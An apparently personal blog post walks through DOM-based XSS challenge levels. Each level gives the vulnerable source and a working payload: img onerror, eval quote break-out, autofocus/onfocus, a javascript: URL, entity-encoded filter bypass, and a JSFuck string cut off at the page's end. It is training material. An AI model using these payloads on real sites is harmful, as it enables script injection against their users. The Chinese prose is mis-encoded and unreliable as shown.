<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="XSS-DOMç ´å"><meta name="keywords" content="XSS,DOMç ´å"><meta name="author" content="JGwebre,undefined"><meta name="copyright" content="JGwebre"><title>XSS-DOMç ´åã€JGçš„ä¸ªäººåšå®¢ã€‘</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- script(src=url_for("/js/mathjax/mathjax.js"))--><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('è¯·è¾“å…¥æ–‡ç« å¯†ç ') !== '') {
        alert('å¯†ç é”™è¯¯ï¼');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"M89DTZNQI5","apiKey":"3349454e63ed12455aa77088742476f1","indexName":"heisha","hits":{"per_page":10},"languages":{"input_placeholder":"æœç´¢æ–‡ç« ","hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹:${query}","hits_stats":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},
  localSearch: {"path":"search.json","languages":{"hits_empty":"local_search.hits_empty"}},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  gitment: {},
  valine: {"appId":"vBmF8qvDShMMqm39diUFWroM-gzGzoHsz","appKey":"vcClV59WM7pPzz3R46pITQlv","placeholder":"welcome to say something..."},
  twikoo: {},
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="JGçš„ä¸ªäººåšå®¢" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="æ–‡ç« ç›®å½•">ç«™ç‚¹æ¦‚è§ˆ</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">ç›®å½•</div><div class="sidebar-toc-progress"><span class="progress-notice">æ‚¨å·²é˜…è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">ç¬¬ä¸€å…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">2.</span> <span class="toc-text">ç¬¬äºŒå…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">ç¬¬ä¸‰å…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="toc-number">4.</span> <span class="toc-text">ç¬¬å››å…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="toc-number">5.</span> <span class="toc-text">ç¬¬äº”å…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3"><span class="toc-number">6.</span> <span class="toc-text">ç¬¬å…­å…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3"><span class="toc-number">7.</span> <span class="toc-text">ç¬¬ä¸ƒå…³</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">7.1.</span> <span class="toc-text">ç¬¬ä¸€ç§æ–¹æ³•</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">7.2.</span> <span class="toc-text">ç¬¬äºŒç§æ–¹æ³•</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">7.3.</span> <span class="toc-text">ç¬¬ä¸‰ç§æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3"><span class="toc-number">8.</span> <span class="toc-text">ç¬¬å…«å…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3"><span class="toc-number">9.</span> <span class="toc-text">ç¬¬ä¹å…³</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3"><span class="toc-number">10.</span> <span class="toc-text">ç¬¬åå…³</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">JGwebre</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/heisha123" target="_blank">GitHub<i class="icon-dot bg-color4"></i></a><a class="links-button button-hover" href="mailto:gzyjslb@163.com" target="_blank">E-Mail<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1852384503&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color10"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">æ—¥å¿—</span><span class="pull-bottom">20</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">æ ‡ç­¾</span><span class="pull-bottom">14</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">åˆ†ç±»</span><span class="pull-bottom">2</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">é¦–é¡µ</a><a class="menu-item" href="/tags">æ ‡ç­¾</a><a class="menu-item" href="/categories">åˆ†ç±»</a><a class="menu-item" href="/archives">å½’æ¡£</a><a class="menu-item" href="/about">å…³äº</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> æœç´¢</span></a><a class="title-name" href="/">JGçš„ä¸ªäººåšå®¢</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">XSS-DOMç ´å</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> å‘è¡¨äº 2025-07-14 | æ›´æ–°äº 2025-07-25</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">webå®‰å…¨</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/XSS/">XSS</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/DOM%E7%A0%B4%E5%9D%8F/">DOMç ´å</a></div></div></div><div class="main-content"><p>DOMç ´ååŸºç¡€</p>
<span id="more"></span>

<h5 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714163349243.png" alt="image-20250714163349243"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>getä¼ å€¼somebody ç›´æ¥ç»™h2æ·»åŠ å±æ€§</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?somebody=&lt;img src=&quot;1&quot; onerror=&quot;alert(1337)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714164602338.png" alt="image-20250714164602338"></p>
<h5 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714164629867.png" alt="image-20250714164629867"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class="line">    let ma = &quot;&quot;</span><br><span class="line">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        maname.innerText = ma</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>ä¸€æ ·çš„getè·å–jeffçš„å€¼  åˆ©ç”¨ç‚¹åœ¨eval</p>
<p>æˆ‘ä»¬å¯ä»¥é—­åˆ<code>&quot;</code> ç„¶åç›´æ¥<code>alert(1337)</code></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?jeff=&quot;;alert(1)//</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714165226881.png" alt="image-20250714165226881"></p>
<h5 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714165258839.png" alt="image-20250714165258839"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class="line">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class="line">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>ä¸€æ ·é€šè¿‡wey getä¼ é€’å€¼</p>
<p>ä½†æ˜¯ç»è¿‡äº†<code>wey.replace(/[&lt;&gt;]/g, &#39;&#39;)</code> è¿‡æ»¤ï¼Œè¿‡æ»¤äº† <code>&lt;&gt;</code> </p>
<p>ç„¶åé€šè¿‡<code>innerHTML</code>ç»™<code>uganda</code> èµ‹å€¼</p>
<p>å› ä¸ºä¸èƒ½é€šè¿‡ ç”¨æˆ·äº¤äº’ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨onçš„ç‚¹å‡»æ—¶é—´</p>
<p>ä½†æ˜¯æœ‰ä¸€ä¸ªè‡ªåŠ¨è·å–ç„¦ç‚¹çš„å‡½æ•° <code>onfocus</code> å¹¶ä¸”è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªè‡ªåŠ¨è·å–ç„¦ç‚¹çš„å‚æ•° <code>autofocus</code> </p>
<p>å³å¯å®ç°è‡ªåŠ¨å¼¹çª—</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wey=&quot;autofocus%20onfocus=alert(1337)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714170139855.png" alt="image-20250714170139855"></p>
<h5 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714170220070.png" alt="image-20250714170220070"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class="line">    setTimeout(_ =&gt; &#123;</span><br><span class="line">        ricardo.submit()</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>é€šè¿‡<code>ricardo</code> getä¼ å‚ ç„¶åè®¾ç½®å®šæ—¶å™¨ 2ç§’è‡ªåŠ¨æäº¤ç»™formè¡¨å•</p>
<p>ç„¶åform è¡¨å•ä¸­æœ‰method å±æ€§æ¥æ”¶çš„GET  è¡¨å•å±æ€§å¯ä»¥é€šè¿‡<code>javascript:</code> ä¼ªåè®®è§£æalert</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ricardo=javascript:alert(1337)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714171021502.png" alt="image-20250714171021502"></p>
<h5 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714171502986.png" alt="image-20250714171502986"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class="line">    smith = smith.replace(/[\(\`\)\\]/g, &#x27;&#x27;)</span><br><span class="line">    will.innerHTML = smith</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>getä¼ æ‰¿ <code>markassbrownlee</code> è·å–å€¼ ï¼Œ <code>will.innerHTML = smith</code> æ·»åŠ å±æ€§ï¼Œä½†æ˜¯</p>
<p><code>smith.replace(/[\(\\)\\]/g, &#39;&#39;)</code> è¿‡æ»¤äº†<code>()\</code></p>
<p>æ‰€ä»¥alertçš„è¿™ä¸ªæ‹¬å· è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è€ƒè™‘é€šè¿‡å®ä½“ç¼–ç ç»•è¿‡</p>
<p>å› ä¸ºæˆ‘ä»¬åœ¨<code>url</code>åœ°å€æ ä¼ å…¥çš„å‚æ•° å…ˆä¼šç»è¿‡æµè§ˆå™¨è¿›è¡Œ<code>decode</code> ç„¶åè¿›å…¥ <code>js</code> æ¥æ”¶åˆ°å€¼åï¼Œé€šè¿‡äº†è¿‡æ»¤å‡½æ•°ï¼Œåœ¨è¿›å…¥<code>html</code> ï¼Œå®ä½“ç¼–ç è¢«è§£æä¸º<code>()</code> </p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?markassbrownlee=&lt;img src=&quot;1&quot; onerror=&quot;alert%26lpar%3B%26%2349%3B%26%2351%3B%26%2351%3B%26%2355%3B%26rpar%3B&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714172528731.png" alt="image-20250714172528731"></p>
<h5 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714172546097.png" alt="image-20250714172546097"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Challenge */</span><br><span class="line">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class="line">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class="line">eval(balls)</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>è¿‡æ»¤æ‰äº†å¤§å°å†™å­—æ¯ï¼Œè¿˜æœ‰æ•°å­—</p>
<p>çœ‹è§äº†<code>eval</code>å‡½æ•° åˆ©ç”¨ç‚¹å°±åœ¨è¿™</p>
<p>ç°åœ¨å°±æ˜¯è€ƒè™‘æ€ä¹ˆç»•è¿‡è¿™ä¸ªæ­£åˆ™</p>
<p>æƒ³åˆ°äº†jsfuck</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173009491.png" alt="image-20250714173009491"></p>
<p>ç›´æ¥é€šè¿‡</p>
<p>è¿™ä¸ªç¼–ç ï¼Œç„¶åè¿›è¡Œä¸€ä¸‹<code>urlencode</code>ç¼–ç  </p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?balls=%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%28%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%2B%5B%21%5B%5D%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%2B%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%29%29%5B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%5B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%28%2B%5B%5D%29%5B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%5D%28%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%2B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%29%28%29%28%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%2B%28%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B